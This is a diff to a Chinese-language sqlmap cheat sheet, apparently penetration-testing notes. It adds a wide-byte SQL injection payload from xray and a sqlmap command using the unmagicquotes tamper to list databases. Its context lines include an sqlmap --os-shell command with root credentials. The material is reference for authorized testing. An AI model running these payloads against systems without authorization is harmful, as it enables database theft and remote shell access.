@@ -1,5 +1,10 @@
 # sqlmap
 自定义
+
+xray 注入检测payload
+```
+1鎈'"\(  宽字节  对应sqlmap --tamper unmagicquotes
+```
 ```
 # Sqlmap
 
@@ -124,6 +129,7 @@ sqlmap -d "mysql://root:root@192.168.1.1:3306/mysql" --os-shell
 **宽字节检测**
 ```bash
 sqlmap -u URL --dbms mysql --prefix "%df%27" --technique U -v 3     # 宽字节检测
+sqlmap -u URL --dbms mysql --tamper unmagicquotes --dbs -v 3     # 宽字节注入
 ```
 
 **union 语句测试**
